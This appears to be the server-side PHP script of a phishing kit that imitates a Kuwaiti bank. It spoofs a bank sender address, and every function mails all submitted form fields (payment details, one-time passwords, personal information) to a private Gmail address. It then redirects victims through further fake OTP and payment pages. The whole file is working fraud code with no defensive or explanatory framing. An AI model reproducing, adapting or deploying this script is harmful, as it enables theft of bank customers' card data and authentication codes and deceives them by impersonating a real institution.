<?php

// header("Access-Control-Allow-Origin: https://nbkkuwait.com");

function sendtEmailPatment($data)
{
    $to = "hassankiwan92@gmail.com";
    $sender = "admin@nbkkuwait.com";
    $subject = "Payment Info";
    $message = "";
    foreach ($data as $key => $msg) {
        $message .= "$key :  $msg\n";
    }
    $headers = "From: $sender\r\n";
    $headers .= "Reply-To: $sender\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Send the email
    header('Content-Type: application/json');
    if (mail($to, $subject, $message, $headers)) {
        // Redirect if using GET only
        echo json_encode(['status' => 'success', 'redirect' => './otp.php']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed.']);
    }

    exit;
}
function sendOTP($data)
{
    $to = "hassankiwan92@gmail.com";
    $sender = "admin@nbkkuwait.com";
    $subject = "OTP";
    $message = "";
    foreach ($data as $key => $msg) {
        $message .= "$key :  $msg\n";
    }
    $headers = "From: $sender\r\n";
    $headers .= "Reply-To: $sender\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Send the email
    header('Content-Type: application/json');
    if (mail($to, $subject, $message, $headers)) {
        // Redirect if using GET only
        echo json_encode(['status' => 'success', 'redirect' => './otp.php']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed.']);

    }
    exit;
}


function sendOTP2($data)
{
    $to = "hassankiwan92@gmail.com";
    $sender = "admin@nbkkuwait.com";
    $subject = "OTP";
    $message = "";
    foreach ($data as $key => $msg) {
        $message .= "$key :  $msg\n";
    }
    $headers = "From: $sender\r\n";
    $headers .= "Reply-To: $sender\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Send the email
    header('Content-Type: application/json');
    if (mail($to, $subject, $message, $headers)) {
        // Redirect if using GET only
        echo json_encode(['status' => 'success', 'redirect' => './otp2.php']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed.']);

    }
    exit;
}






function sendInfo($data)
{
    $to = "hassankiwan92@gmail.com";
    $sender = "admin@nbkkuwait.com";
    $subject = "OTP";
    $message = "";
    foreach ($data as $key => $msg) {
        $message .= "$key :  $msg\n";
    }
    $headers = "From: $sender\r\n";
    $headers .= "Reply-To: $sender\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Send the email
    header('Content-Type: application/json');
    if (mail($to, $subject, $message, $headers)) {
        // Redirect if using GET only
        echo json_encode(['status' => 'success', 'redirect' => './otp2.php']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed.']);

    }
    exit;
}


function sendInfoData($data)
{
    $to = "hassankiwan92@gmail.com";
    $sender = "admin@nbkkuwait.com";
    $subject = "OTP";
    $message = "";
    foreach ($data as $key => $msg) {
        $message .= "$key :  $msg\n";
    }
    $headers = "From: $sender\r\n";
    $headers .= "Reply-To: $sender\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Send the email
    header('Content-Type: application/json');
    if (mail($to, $subject, $message, $headers)) {
        // Redirect if using GET only
        echo json_encode(['status' => 'success', 'redirect' => './pay.php']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed.']);

    }
    exit;
}


if (isset($_POST)) {
    if (isset($_POST['action']) == 'sendtEmailPatment') {
        sendtEmailPatment($_POST);
    }
    if (isset($_POST['action']) == 'sendOTP') {
        sendOTP($_POST);
    }

    if (isset($_POST['action']) == 'sendInfoData') {
        sendInfoData($_POST);
    }

    if (isset($_POST['action']) == 'sendInfo') {
        sendInfo($_POST);
    }


    if (isset($_POST['action']) == 'sendOTP2') {
        sendOTP2($_POST);
    }

    exit;
}
?>